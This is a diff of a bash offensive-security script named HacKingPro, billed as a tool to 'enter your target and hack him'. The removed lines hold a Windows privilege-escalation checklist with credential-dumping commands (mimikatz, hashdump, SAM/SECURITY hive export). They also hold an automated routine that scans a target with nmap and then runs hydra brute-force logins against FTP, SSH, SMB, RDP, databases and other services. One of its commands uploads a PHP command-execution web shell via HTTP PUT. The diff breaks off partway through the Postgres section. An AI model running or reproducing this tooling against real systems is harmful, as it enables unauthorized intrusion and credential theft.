@@ -6,24 +6,49 @@
 #!/usr/bin/env bash
 #!/data/data/com.termux/files/usr/bin/sh
 #!/data/data/com.termux/files/usr/bin/bash
-###############################################
-# Name : Anlominus ~ HacKingPro
-# Description : HacKingPro ~ enter your target and Hack Him in the end get Markdown Report.
-# Created Date : 2022 May
-# [ Last UPDATE ] ──╼ [ 20-07-2022 ]
-# Aouther: Anlominus ~> RhytMix ~> HacKingPro
-# Skils: Best Copywriter IN the COSMOS!
-# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE GREAT SCRIPTS
-# CREDIT: To All World Creators free Scripts & Tools
-# Location: Made With LOVE IN ISRAEL !
-# Source: https://github.com/Anlominus/HacKingPro
-###############################################
-LastUPDATE="2022 July 20"
+###############################################################
+#                                                             #
+# Created Date : 2022 May                                     #
+# Location: Made With LOVE IN ISRAEL !                        #
+# CREDIT: To All World Creators free Scripts & Tools          #
+# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE          #
+# GREAT SCRIPTS                                               #
+#                                                             #
+###############################################################
+#                                                             #
+#-Metadata----------------------------------------------------#
+#                                                             #
+#  Filename: HacKingPro                  (Update: 31-07-2022) #
+#  Source: https://github.com/Anlominus/HacKingPro            #
+#                                                             #
+#-Info--------------------------------------------------------#
+#                                                             #
+#  Enter Your Target, Hack Him, and Get Markdown Report       #
+#                                                             #
+#-Author(s)---------------------------------------------------#
+#                                                             #
+#  AnLoMinus ~ https://github.com/AnLoMinus/                  #
+#  Skils: Best Copywriter IN the COSMOS!                      #
+#                                                             #
+#-Operating System--------------------------------------------#
+#                                                             #
+#  Designed for: Kali / Parrot / Pentoo (VM - VMware)         #
+#     Tested on: MacOS                                        #
+#                                                             #
+#-Notes-------------------------------------------------------#
+# - Run as root                                               #
+# - complete section 1                                        #
+#                             ---                             #
+#                                                             #
+###############################################################
+LastUPDATE="2022 July 31"
 ToolSource="https://github.com/AnLoMinus/HacKingPro"
 ###############################################
+
 clear
 chmod +x $0
 chmod +x *
+
 ###############################################
 
 ###############################################
@@ -85,11 +110,58 @@ about() {
 ###############################################
 
 HacKingProColors(){
+
+###############################################
+# Text Attributes
+###############################################
+
+# Reset text formatting and colors.
+resetT="\033[m"
+# Bold text
+boldT="\033[1m"
+# Faint text.
+faintT="\033[2m"
+# Italic text.
+italicT="\033[3m"
+# Underline text.
+underT="\033[4m"
+# Slow blink.
+slowBlink="\033[5m"
+# Swap foreground and background colors.
+swapFandBC="\033[7m"
+# Hidden text.
+hidden="\033[8m"
+# Strike-through text.
+strikeThroughT="\033[9m"
+
 ##############################################################################
 # COLORS AND BACKGROUNDS
 ##############################################################################
 Color_Off='\033[0m' # Text Reset
 ORANGE='\033[1;38;5;202m'
+
+C=$(printf '\033')
+RED="${C}[1;31m"
+SED_RED="${C}[1;31m&${C}[0m"
+GREEN="${C}[1;32m"
+SED_GREEN="${C}[1;32m&${C}[0m"
+YELLOW="${C}[1;33m"
+SED_YELLOW="${C}[1;33m&${C}[0m"
+SED_RED_YELLOW="${C}[1;31;103m&${C}[0m"
+BLUE="${C}[1;34m"
+SED_BLUE="${C}[1;34m&${C}[0m"
+ITALIC_BLUE="${C}[1;34m${C}[3m"
+LIGHT_MAGENTA="${C}[1;95m"
+SED_LIGHT_MAGENTA="${C}[1;95m&${C}[0m"
+LIGHT_CYAN="${C}[1;96m"
+SED_LIGHT_CYAN="${C}[1;96m&${C}[0m"
+LG="${C}[1;37m" #LightGray
+SED_LG="${C}[1;37m&${C}[0m"
+DG="${C}[1;90m" #DarkGray
+SED_DG="${C}[1;90m&${C}[0m"
+NC="${C}[0m"
+UNDERLINED="${C}[5m"
+ITALIC="${C}[3m"
 
 # Regular Colors
 Black='\033[0;30m'  # Black
@@ -172,30 +244,7 @@ cDanger="$yellow ⚠️ $red"
 # |
 
 ###############################################
-# Text Attributes
-###############################################
-
-# Reset text formatting and colors.
-resetT="\033[m"
-# Bold text
-boldT="\033[1m"
-# Faint text.
-faintT="\033[2m"
-# Italic text.
-italicT="\033[3m"
-# Underline text.
-underT="\033[4m"
-# Slow blink.
-slowBlink="\033[5m"
-# Swap foreground and background colors.
-swapFandBC="\033[7m"
-# Hidden text.
-hidden="\033[8m"
-# Strike-through text.
-strikeThroughT="\033[9m"
-
-###############################################
-# Checking Running Direction
+#         Checking Running Direction
 ###############################################
 
 CheckPWD(){
@@ -207,126 +256,16 @@ CheckPWD(){
 CheckPWD
 
 ###############################################
-# Put Current PID in Variable
+#         Put Current PID in Variable
 ###############################################
 
 thisPID=$(echo "$$")
 currentPID=$(echo "$thisPID")
 
 ###############################################
-# WinPrivEsc
+#         Cover Me Cleaning Logs and more.
 ###############################################
 
-WinPrivEsc(){
-  ## Privilege escalation
-
-  # Now we start the whole enumeration-process over gain.
-  # This is a checklist. You need to check of every single one, in this order.
-  echo "
-  - OS:
-    - Look for hotfixes
-      - systeminfo:
-      - wmic qfe get Caption,Description,HotFixID,InstalledOn
-      - set
-  - Version:
-  - Architecture:
-  - Current user:
-  - Hotfixes:
-  - Antivirus:
-
-  - Kernel exploits
-  - Cleartext password
-  - Reconfigure service parameters
-  - Inside service
-  - Program running as root
-  - Installed software
-  - Scheduled tasks
-  - Weak passwords
-
-  - Users
-    - hostname
-    - net users
-    - net user user1
-    - accesschk.exe -uwcqv 'Authenticated Users' *
-
-  - LocalGroups
-    - net localgroups
-
-  - netsh firewall show state
-  - netsh firewall show config
-
-  - Set path
-    - set PATH=%PATH%;C:\xampp\php
-
-    ### Cleartext passwords
-
-  - Windows autologin
-    - reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon'
-
-  - VNC
-    - reg query 'HKCU\Software\ORL\WinVNC3\Password'
-
-  - SNMP Parameters
-    - reg query 'HKLM\SYSTEM\Current\ControlSet\Services\SNMP'
-
-  - Putty
-    - reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions'
-
-  - Search for password in registry
-    - reg query HKLM /f password /t REG_SZ /s
-    - reg query HKCU /f password /t REG_SZ /s
-
-  - Installed software
-    - Metasploit
-      - ps
-      - tasklist /SVC
-      - net start
-      - reg query HKEY_LOCAL_MACHINE\SOFTWARE
-      - DRIVERQUERY
-    - Look in:
-      - C:\Program files
-      - C:\Program files (x86)
-    Home directory of the user
-
-  - Interesting files
-    - Meterpreter
-      - search -f *.txt
-      - search -f *.zip
-      - search -f *.doc
-      - search -f *.xls
-      - search -f config*
-      - search -f *.rar
-      - search -f *.docx
-      - search -f *.sql
-    - How to cat files in meterpreter
-      - cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt
-    - Recursive search
-      - dir /s
-
-    - Passwords and hashes
-      - wce32.exe -w
-      - wce64.exe -w
-      - fgdump.exe
-      - reg.exe save hklm\sam c:\sam_backup
-      - reg.exe save hklm\security c:\security_backup
-      - reg.exe save hklm\system c:\system
-      - Meterpreter
-        - hashdump
-        - load mimikatz
-        - msv
-
-  - Browser
-    - Browser start-page:
-    - Browser-history:
-    - Saved passwords:
-
-  "
-
-}
-
-###############################################
-# Cover Me Cleaning Logs and more.
-###############################################
 CoverMe(){
 
   LOGS_FILES=$(
@@ -617,7 +556,7 @@ CoverMe(){
 }
 
 ###############################################
-# HackTricks Menu
+#         HackTricks Menu
 ###############################################
 
 HackTricks(){
@@ -668,606 +607,6 @@ while true; do
 }
 
 ###############################################
-# Brute Force Menu
-###############################################
-
-BruteForce(){
-
-  # Creating Scans and Output Folders
-  Report() {
-    cd "$XHacKingProCaseTargetName"
-    echo "${BGreen}┌─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} AttacKing ${BRed}]"
-    mkdir AttacKing
-    cd AttacKing
-    echo "${BGreen}|─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Scans ${BRed}]"
-  	mkdir Scans Scans/${1} &> /dev/null
-    echo "${BGreen}|─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Output ${BRed}]"
-    mkdir Output Output/${1} &> /dev/null
-    echo "${BGreen}└─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} AttacKing ${BRed}]"
-    read -p "$Press_ENTER"
-  }
-  Report
-
-  # Represent that Bruteforce finished
-  Finished_Brute() {
-    echo "[${green}*${default}] Bruteforce finished. Credentials found saved at: Output/${1}/."
-    sleep 1
-  }
-
-  ftp_up="${xAttacKing}/Wordlist/ftp_up.txt"
-  ftp_u="${xAttacKing}/Wordlist/ftp_u.txt"
-  ftp_p="${xAttacKing}/Wordlist/ftp_p.txt"
-  ssh_up="${xAttacKing}/Wordlist/ssh_up.txt"
-  ssh_u="${xAttacKing}/Wordlist/ssh_u.txt"
-  ssh_p="${xAttacKing}/Wordlist/ssh_p.txt"
-  smtp_u="${xAttacKing}/Wordlist/smtp_u.txt"
-  smtp_p="${xAttacKing}/Wordlist/smtp_p.txt"
-  pop_u="${xAttacKing}/Wordlist/pop_u.txt"
-  pop_p="${xAttacKing}/Wordlist/pop_p.txt"
-  telnet_up="${xAttacKing}/Wordlist/telnet_up.txt"
-  telnet_u="${xAttacKing}/Wordlist/telnet_u.txt"
-  telnet_p="${xAttacKing}/Wordlist/telnet_p.txt"
-  sql_u="${xAttacKing}/Wordlist/sql_u.txt"
-  sql_p="${xAttacKing}/Wordlist/sql_p.txt"
-  mssql_up="${xAttacKing}/Wordlist/mssql_up.txt"
-  mysql_up="${xAttacKing}/Wordlist/mysql_up.txt"
-  oracle_up="${xAttacKing}/Wordlist/oracle_up.txt"
-  postgres_up="${xAttacKing}/Wordlist/postgres_up.txt"
-  windows_u="${xAttacKing}/Wordlist/windows_u.txt"
-  windows_up="${xAttacKing}/Wordlist/windows_up.txt"
-  user="${xAttacKing}/Wordlist/user.txt"
-  pass="${xAttacKing}/Wordlist/pass.txt"
-  snmp_p="${xAttacKing}/Wordlist/snmp.txt"
-  vnc_p="${xAttacKing}/Wordlist/vnc_p.txt"
-  thread="16"
-
-  Port_Scan() {
-    echo " "
-  	echo "       ${BBlue}┌──[ 🎯 ]──[${BRed} Target ${BBlue}]──╼ ${BGreen} ${targetIP} ${BBlue}|  Number of threads: ${BGreen} ${thread}."
-  	echo "       ${BBlue}└──[ 🎯 ]──[${BRed} Agressive ${BBlue}]──╼ ${DGrey} Starting agressive scan of supported ports against: ${BGreen} ${targetIP}...\n"
-  	sleep 1
-  	sudo nmap -T4 -Pn -v --open ${targetIP} -p 21,22,23,25,53,80,110,139,162,389,443,445,512,513,514,993,1433,1521,3306,3389,5432,5900,5901,6667,8000,8080 >> "nmap.log"
-  	echo "[${yellow}*${default}] Scan finished."
-  	read -p "$Press_ENTER"
-  	pwd
-  	ls
-    read -p "$Press_ENTER"
-  	sleep 1
-  }
-  Port_Scan
-
-  echo " "
-
-  # Port 21 - (FTP)
-  BruteFTP(){
-    # - Name:
-    # - Version:
-    # - Anonymous login:
-    if grep -q 21/tcp $XHacKingProCaseTargetNameAttacKing/nmap.log; then
-      echo "        ${BBlue}┌──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 21(FTP) is open. Starting bruteforce...\n"
-      BruteFTP_Open="$(echo " ${BBlue}[${BGreen} Open ${BBlue}] ")"
-      AfterBruteFTP="${BruteFTP_Open}"
-      # echo "${AfterBruteFTP}"
-      sleep 1
-      nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 ${targetIP}
-      hydra -C $ftp_up ${targetIP} ftp -e ns -o Output/${targetIP}/ftp_${targetIP}.txt -I -V -t $thread
-      hydra -L $ftp_u -P $ftp_p ${targetIP} ftp -e ns -o Output/${targetIP}/ftp1_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}┌──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 21(FTP) is not open. Skipping to next port..."
-      BruteFTP_Close="$(echo " ${BBlue}[${BRed} Closed ${BBlue}] ")"
-      AfterBruteFTP="${BruteFTP_Close}"
-      # echo "${AfterBruteFTP}"
-    fi
-  }
-  BruteFTP
-
-  #  Port 22 - (SSH)
-  BruteSSH(){
-    # - Name:
-    # - Version:
-    # - Protocol:
-    # - RSA-key-fingerprint:
-    # - Takes-password:
-    # If you have usernames test login with username:username
-    if grep -q 22/tcp nmap.log; then
-      BruteSSH_Open="$(echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 22(SSH) is open. Starting bruteforce...\n")"
-      AfterBruteSSH="${BruteSSH_Open}"
-      echo "${AfterBruteSSH}"
-		  sleep 1
-		  hydra -C $ssh_up ${targetIP} ssh -e ns -o Output/${targetIP}/ssh_${targetIP}.txt -I -V -t $thread
-      hydra -L $ssh_u -P $ssh_p ${targetIP} ssh -e ns -o Output/${targetIP}/ssh1_${targetIP}.txt -I -V -t $thread
-		  hydra -L $user -p $pass ssh -e ns -o Output/${targetIP}/ssh2_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      BruteSSH_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 22(SSH) is not open. Skipping to next port...")"
-      AfterBruteSSH="${BruteSSH_Close}"
-      echo "${AfterBruteSSH}"
-    fi
-  }
-  BruteSSH
-
-  #  Port 23 - (Telnet)
-  BruteTelnet(){
-    if grep -q 23/tcp nmap.log; then
-      BruteTelnet_Open="$(echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 23(Telnet) is open. Starting bruteforce...\n")"
-      AfterBruteTelnet="${BruteTelnet_Close}"
-      echo "${AfterBruteTelnet}"
-      sleep 1
-      hydra -C $telnet_up ${targetIP} telnet -e ns -o Output/${targetIP}/telnet_${targetIP}.txt -I -V -t $thread
-      hydra -L "$telnet_u" -P "$telnet_p" "${targetIP}" telnet -e ns -o Output/"${targetIP}"/telnet1_"${targetIP}".txt -I -V -t $thread
-      hydra -L $user -P $pass ${targetIP} telnet -e ns -o Output/${targetIP}/telnet2_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      BruteTelnet_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 23(Telnet) is not open. Skipping to next port...")"
-      AfterBruteTelnet="${BruteTelnet_Close}"
-      echo "${AfterBruteTelnet}"
-    fi
-  }
-  BruteTelnet
-
-  #  Port 25 - (SMTP)
-  BruteSMTP(){
-    # - Name:
-    # - Version:
-    # - VRFY:
-    # - EXPN:
-    if grep -q 25/tcp nmap.log; then
-      BruteSMTP_Open="$(echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 25(SMTP) is open. Starting bruteforce...\n")"
-      AfterBruteSMTP="${BruteSMTP_Open}"
-      nc -nvv ${targetIP} 25
-      # echo "${AfterBruteSMTP}"
-      sleep 1
-      nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 ${targetIP}
-      hydra -L $user -P $pass ${targetIP} smtp-enum -e ns -o Output/${targetIP}/smtp-enum_${targetIP}.txt -I -V -t $thread
-	    hydra -L $smtp_u -P $smtp_p ${targetIP} smtp -e ns -o Output/${targetIP}/smtp_${targetIP}.txt -I -V -t $thread
-      hydra -L $user -P $pass ${targetIP} smtp -e ns -o Output/${targetIP}/smtp1_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      BruteSMTP_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 25(SMTP) is not open. Skipping to next port...")"
-      AfterBruteSMTP="${BruteSMTP_Close}"
-      echo "${AfterBruteSMTP}"
-    fi
- }
-  BruteSMTP
-
-  #  Port 80 - (HTTP)
-  BruteHTTP(){
-    # - Server:
-    # - Scripting language:
-    # - Apache Modules:
-    # - Domain-name address:
-    # - Web application
-    # - Name:
-    # - Version:
-   if grep -q 80/tcp nmap.log; then
-     echo "        ${AfterBruteHTTP} ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 80(HTTP) is open. Starting bruteforce...\n"
-     BruteHTTP_Open="$(echo " ${BBlue}[${BGreen} Open ${BBlue}] ")"
-     AfterBruteHTTP="${BruteHTTP_Open}"
-     echo ""
-     # Nikto
-     nikto -h http://${targetIP}
-
-     # Nikto with squid proxy
-     nikto -h ${targetIP} -useproxy http://${targetIP}:4444
-
-     # Get header
-     curl -i ${targetIP}
-
-     # Get everything
-     curl -i -L ${targetIP}
-
-     # Check if it is possible to upload using put
-     curl -v -X OPTIONS http://${targetIP}/
-     curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://${targetIP}/test/shell.php
-
-     # Check for title and all links
-     dotdotpwn.pl -m http -h ${targetIP} -M GET -o unix
-
-	   sleep 1
-	   hydra -L $user -P $pass ${targetIP} service http-get -o Output/${targetIP}/http-get_${targetIP}.txt -I -V / -t $thread
-     Finished_Brute "${targetIP}"
-   else
-
-     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 80(HTTP) is not open. Skipping to next port..."
-     BruteHTTP_Close="$(echo " ${BBlue}[${BRed} Closed ${BBlue}] ")"
-     AfterBruteHTTP="${BruteHTTP_Close}"
-     # echo "${AfterBruteHTTP}"
-   fi
- }
-  BruteHTTP
-
-  #  Port 110 - (POP3)
-  BrutePOP3(){
-    # - Name:
-    # - Version:
-    if grep -q 110/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 110(POP3) is open. Starting bruteforce...\n"
-      sleep 1
-      hydra -L $pop_u -P $pop_p ${targetIP} pop3 -e ns -o Output/${targetIP}/pop3_${targetIP}.txt -I -V -t $thread
-      hydra -L $user -P $pass ${targetIP} pop3 -e ns -o Output/${targetIP}/pop3_1_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 110(POP3) is not open. Skipping to next port..."
-    fi
-  }
-  BrutePOP3
-
-  #  Port 139 - (SMB)
-  BruteSMB(){
-    # - Name:
-    # - Version:
-    # - Domain/workgroup name:
-    # - Domain-sid:
-    # - Allows unauthenticated login:
-    if grep -q 139/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 139(SMB) is open. Starting bruteforce...\n"
-      sleep 1
-      enum4linux -a ${targetIP}
-      smbclient -L ${targetIP}
-      nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse ${targetIP} -p 445
-      hydra -L $windows_u -P $pass ${targetIP} smb -S 139 -e ns -o Output/${targetIP}/smb_139_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 139(SMB) is not open. Skipping to next port..."
-    fi
-
-  }
-  BruteSMB
-
-  #  Port 162 - (SNMP)
-  BruteSNMP(){
-    if grep -q 162/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 162(SNMP) is open. Starting bruteforce..."
-      sleep 1
-      nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes ${targetIP}
-      snmp-check -t ${targetIP} -c public  # Common community strings:    [  public   /   private   /   community  ]
-
-      hydra -P $snmp snmp -S 162 -e ns -o Output/${targetIP}/snmp_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 162(SNMP) is not open. Skipping to next port..."
-    fi
-  }
-  BruteSNMP
-
-  #  Port 389 - (LDAP)
-  BruteLDAP(){
-    if grep -q 389/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 389(LDAP) is open. Starting bruteforce...\n"
-      sleep 1
-      hydra -L $windows_u -P $pass ${targetIP} service ldap2 -S 389 -e ns -o Output/${targetIP}/ldap2_${targetIP}.txt -I -V -t $thread
-      hydra -L $windows_u -P $pass ${targetIP} service ldap3 -S 389 -e ns -o Output/${targetIP}/ldap3_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 389(LDAP) is not open. Skipping to next port..."
-    fi
-
-  }
-  BruteLDAP
-
-  #  Port 443 - (HTTPS)
-  BruteHTTPS(){
-    if grep -q 443/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 443(HTTPS) is open. Starting bruteforce...\n"
-      sleep 1
-      sslscan ${targetIP}:443
-      hydra -l $user -P $pass ${targetIP} service https-get -s 443 -o Output/${targetIP}/https-get_${targetIP}.txt -I -V -m / -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 443(HTTPS) is not open. Skipping to next port..."
-    fi
-  }
-  BruteHTTPS
-
-  #  Port 445 - (SMB)
-  BruteSMB445(){
-    if grep -q 445/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 445(SMB) is open. Starting bruteforce...\n"
-      sleep 1
-      enum4linux -a ${targetIP}
-      smbclient -L ${targetIP}
-      nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse ${targetIP} -p 445
-      hydra -C $windows_up ${targetIP} smb -S 445 -e ns -o Output/${targetIP}/smb_445_${targetIP}.txt -I -V -t $thread
-      hydra -L $windows_u -P $pass ${targetIP} smb -S 445 -e ns -o Output/${targetIP}/smb_445_2_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 445(SMB) is not open. Skipping to next port..."
-   fi
-  }
-  BruteSMB445
-
-  #  Port 512 - (Rexec)
-  BruteREXEC(){
-    if grep -q 512/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 512(rexec) is open. Starting bruteforce...\n"
-      sleep 1
-      hydra -L $user -P $pass ${targetIP} rexec -S 512 -e ns -o Output/${targetIP}/rexec_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 512(rexec) is not open. Skipping to next port..."
-    fi
-  }
-  BruteREXEC
-
-  #  Port 513 - (Rlogin)
-  BruteRLOGIN(){
-    if grep -q 513/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 513(rlogin) is open. Starting bruteforce...\n"
-      sleep 1
-      hydra -L $user -P $pass ${targetIP} rlogin -S 513 -e ns -o Output/${targetIP}/rlogin_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 513C(rlogin) is not open. Skipping to next port..."
-   fi
-  }
-  BruteRLOGIN
-
-  #  Port 514 - (RSH)
-  BruteRSH(){
-    if grep -q 514/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 514(rsh) is open. Starting bruteforce...\n"
-      sleep 1
-      hydra -L $user -P $pass ${targetIP} rsh -S 514 -e ns -o Output/${targetIP}/rsh_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 514(rsh) is not open. Skipping to next port..."
-    fi
-  }
-  BruteRSH
-
-  #  Port 993 - (IMAP)
-  BruteIMAP(){
-    if grep -q 993/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 993(IMAP) is open. Starting bruteforce...\n"
-      sleep 1
-      hydra -L $user -P $pass ${targetIP} imap -S 993 -e ns -o Output/${targetIP}/imap_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 993(IMAP) is not open. Skipping to next port..."
-    fi
-  }
-  BruteIMAP
-
-  #  Port 1433 - (MSSQL)
-  BruteMSSQL(){
-     # - Version:
-
-     # use auxiliary/scanner/mssql/mssql_ping
-     # Last options. Brute force.
-     # scanner/mssql/mssql_login
-
-     # If you have credentials look in metasploit for other modules
-
-     # Log in to mssql
-     # sqsh -S INSERTIPADDRESS -U sa
-
-     # Execute commands
-     # xp_cmdshell 'date'
-     # go
-     if grep -q 1433/tcp nmap.log; then
-       echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 1433(mssql) is open. Starting bruteforce.../n"
-       sleep 1
-
-       hydra -C $mssql_up ${targetIP} mssql -S 1433 -e ns -o Output/${targetIP}/mssql_${targetIP}.txt -I -V -t $thread
-       hydra -L $windows_u -P $pass ${targetIP} mssql -S 1433 -e ns -o Output/${targetIP}/mssql_1_${targetIP}.txt -I -V -t $thread
-       Finished_Brute "${targetIP}"
-     else
-       echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 1433(mssql) is not open. Skipping to next port..."
-     fi
-
-   }
-  BruteMSSQL
-
-  # Port 1521 - (Oracle)
-  BruteOracle(){
-    # - Name:
-    # - Version:
-    # - Password protected:
-    if grep -q 1521/tcp nmap.log; then
-      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 1521(oracle) is open. Starting bruteforce...\n"
-      sleep 1
-      tnscmd10g version -h ${targetIP}
-      tnscmd10g status -h ${targetIP}
-      hydra -C $oracle_up ${targetIP} oracle -S 1521 -e ns -o Output/${targetIP}/oracle_${targetIP}.txt -I -V -t $thread
-      Finished_Brute "${targetIP}"
-    else
-     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 1521(oracle) is not open. Skipping to next port..."
-   fi
-
-  }
-  BruteOracle
-
-  ### Port 2049 - NFS
-  # showmount -e INSERTIPADDRESS
-  ### If you find anything you can mount it like this:
-  # mount INSERTIPADDRESS:/ /tmp/NFS
-  # mount -t INSERTIPADDRESS:/ /tmp/NFS
-
-  #  Port 3306 (MySQL)
-  BruteMySQL(){
-     # - Name:
-     # - Version:
-     if grep -q 3306/tcp nmap.log; then
-       echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 3306(mysql) is open. Starting bruteforce...\n"
-       sleep 1
-       mysql --host=${targetIP} -u root -p
-       nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 ${targetIP} -p 3306
-
-       hydra -C $mysql_up ${targetIP} mysql -e ns -o Output/${targetIP}/mysql_${targetIP}.txt -I -V -t $thread
-       hydra -L $sql_u -P $sql_p $TARGET mysql -e ns -o Output/${targetIP}/mysql_1_${targetIP}.txt -I -V -t $thread
-       Finished_Brute "${targetIP}"
-     else
-    echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 3306(mysql) is not open. Skipping to next port..."
-  fi
-
-   }
-  BruteMySQL
-
-  ### Port 3339 - Oracle web interface
-  # - Basic info about web service (apache, nginx, IIS)
-  # - Server:
-  # - Scripting language:
-  # - Apache Modules:
-  # - IP-address:
-  # - Domain-name address:
-
-  #  Port 3389 (RDP) Remote Desktop
-  BruteRDP(){
-     # Test logging in to see what OS is running
-     # rdesktop -u guest -p guest ${targetIP} -g 94%
-
-     # Brute force
-     # ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://${targetIP}
-
-     if grep -q 3389/tcp nmap.log; then
-       echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 3389(RDP) is open. Starting bruteforce...\n"
-       sleep 1
-       hydra -C $windows_u ${targetIP} rdp -e ns -o Output/${targetIP}/rdp_${targetIP}.txt -I -V -t $thread
-       hydra -L $windows_u -P $pass ${targetIP} rdp -e ns -o Output/${targetIP}/rdp_1_${targetIP}.txt -I -V -t $thread
-       Finished_Brute "${targetIP}"
-     else
-    echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 3389(RDP) is not open. Skipping to next port..."
-  fi
-
-   }
-  BruteRDP
-
-  #  Port 5432 (PostGres)
-  BrutePostgres(){
